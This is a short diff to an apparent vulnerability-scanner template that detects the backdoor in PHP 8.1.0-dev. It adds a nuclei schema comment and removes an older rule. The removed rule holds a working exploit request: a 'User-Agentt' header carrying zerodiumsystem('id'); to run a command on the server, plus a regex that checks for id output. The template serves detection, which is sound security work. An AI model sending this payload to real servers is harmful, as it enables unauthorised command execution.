@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: php-zerodium-backdoor
 
 info:
@@ -10,13 +11,3 @@ info:
     "PHP/8.1.0-dev"
   reference:
     - http://wiki.peiqi.tech/wiki/language/PHP/PHP%20zerodium%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E.html
-
-rules:
-  r0:
-    request:
-      method: GET
-      path: /
-      headers:
-        User-Agentt: zerodiumsystem('id');
-    expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
-expression: r0()
